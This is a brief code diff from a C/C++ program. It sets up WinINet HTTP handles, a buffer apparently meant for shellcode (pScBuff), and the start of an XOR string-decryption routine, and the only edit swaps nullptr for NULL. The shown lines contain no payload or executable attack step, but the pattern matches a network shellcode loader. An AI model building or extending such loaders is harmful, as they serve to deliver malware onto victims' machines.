@@ -30,7 +30,7 @@ HINTERNET hConn = NULL;
 HINTERNET hReq = NULL;
 LPCSTR headers = "Connection: keep-alive\r\n";
 CHAR buffer[1024];
-LPVOID pScBuff = nullptr;
+LPVOID pScBuff = NULL;
 
 //XOR decrypt string
 void XorEnc2(CHAR* EncStr2)
